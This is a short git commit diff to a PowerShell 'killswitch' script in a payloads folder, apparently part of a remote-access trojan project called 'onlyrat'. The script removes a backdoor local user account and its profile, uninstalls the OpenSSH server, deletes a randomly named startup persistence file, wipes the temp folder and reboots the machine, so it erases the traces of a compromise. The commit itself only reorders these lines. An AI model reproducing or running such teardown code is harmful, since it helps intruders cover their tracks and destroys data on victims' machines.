11b114be7650dbbf6e282059edb3ebf759984442
Blue Cosmo <bluecosmo@localhost.localdomain>
2022-04-16 19:37:06 -0400

    test4

--- payloads/killswitch.ps1
+++ payloads/killswitch.ps1
@@ -1,6 +1,6 @@
-Remove-Item $env:temp/* -r
-Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd"
 Remove-LocalUser -Name "onlyrat"
 Remove-Item "C:/Users/onlyrat"
 Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 shutdown /r
+Remove-Item "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd"
+Remove-Item $env:temp/* -r
